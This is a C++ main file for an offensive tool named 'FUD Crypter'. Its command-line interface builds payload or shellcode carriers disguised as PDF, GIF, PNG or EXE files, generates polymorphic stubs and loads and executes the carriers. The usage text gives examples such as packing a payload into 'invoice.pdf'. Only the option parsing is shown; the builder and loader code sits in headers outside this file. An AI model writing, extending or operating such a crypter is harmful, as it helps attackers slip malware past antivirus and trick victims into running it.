#include "fud_crypter/builder/builder.hpp"
#include "fud_crypter/loader.hpp"
#include <iostream>
#include <cstring>

void print_usage(const char* prog) {
    std::cout << "FUD Crypter v1.0 - Ultimate Payload Obfuscation & Execution\n"
    << "Usage:\n"
    << "  " << prog << " --build <payload> -f <pdf|gif|png|exe> -o <output> [options]\n"
    << "  " << prog << " --load <carrier> -k <keyfile> [--verbose]\n"
    << "\nOptions:\n"
    << "  --build             Build carrier or stub\n"
    << "  --load              Load and execute carrier\n"
    << "  -f, --format        Output format: pdf, gif, png, exe (stub)\n"
    << "  -o, --output        Output file path\n"
    << "  -k, --keyfile       Key file (if not provided, auto-generate)\n"
    << "  --polymorph         Generate polymorphic stub (only with -f exe)\n"
    << "  --execute           Automatically execute after build\n"
    << "  --verbose, -v       Verbose output\n"
    << "  --help, -h          Show this help\n"
    << "\nExamples:\n"
    << "  " << prog << " --build payload.bin -f pdf -o invoice.pdf -k secret.key --execute\n"
    << "  " << prog << " --build shellcode.bin -f exe -o loader.exe --polymorph\n"
    << "  " << prog << " --load invoice.pdf -k secret.key\n";
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    std::string mode;
    fud_crypter::BuilderConfig bcfg;
    fud_crypter::LoaderConfig lcfg;
    bool verbose = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--build" || arg == "-b") {
            mode = "build";
            if (i+1 < argc) bcfg.input_file = argv[++i];
        } else if (arg == "--load" || arg == "-l") {
            mode = "load";
            if (i+1 < argc) lcfg.carrier_file = argv[++i];
        } else if (arg == "-f" || arg == "--format") {
            if (i+1 < argc) bcfg.format = argv[++i];
        } else if (arg == "-o" || arg == "--output") {
            if (i+1 < argc) bcfg.output_file = argv[++i];
        } else if (arg == "-k" || arg == "--keyfile") {
            if (i+1 < argc) {
                bcfg.key_file = argv[++i];
                lcfg.key_file = bcfg.key_file;
            }
        } else if (arg == "--polymorph") {
            bcfg.polymorph = true;
        } else if (arg == "--execute") {
            bcfg.execute = true;
        } else if (arg == "--verbose" || arg == "-v") {
            verbose = true;
            bcfg.verbose = true;
            lcfg.verbose = true;
        } else if (arg == "--help" || arg == "-h") {
            print_usage(argv[0]);
            return 0;
        } else {
            std::cerr << "Unknown option: " << arg << "\n";
            print_usage(argv[0]);
            return 1;
        }
    }

    if (mode == "build") {
        if (bcfg.input_file.empty() || bcfg.output_file.empty() || bcfg.format.empty()) {
            std::cerr << "Error: --build needs -f, -o and payload\n";
            return 1;
        }
        fud_crypter::Builder builder(bcfg);
        return builder.build() ? 0 : 1;
    } else if (mode == "load") {
        if (lcfg.carrier_file.empty() || lcfg.key_file.empty()) {
            std::cerr << "Error: --load needs carrier and -k\n";
            return 1;
        }
        fud_crypter::Loader loader(lcfg);
        return loader.execute() ? 0 : 1;
    } else {
        print_usage(argv[0]);
        return 1;
    }
}
